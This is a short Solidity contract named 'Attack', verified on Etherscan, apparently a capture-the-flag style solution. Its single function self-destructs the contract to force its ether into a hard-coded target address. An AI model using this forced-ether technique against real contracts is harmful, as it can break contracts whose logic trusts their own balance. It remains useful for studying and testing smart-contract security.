/**
 *Submitted for verification at Etherscan.io on 2022-05-25
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract Attack {
    constructor() public {}

    function doit() payable public {
        address payable target = payable(address(0x494A1F4Cfb6caa6CCf79eE847ead706bd3F0DbED));
        selfdestruct(target);
    }
}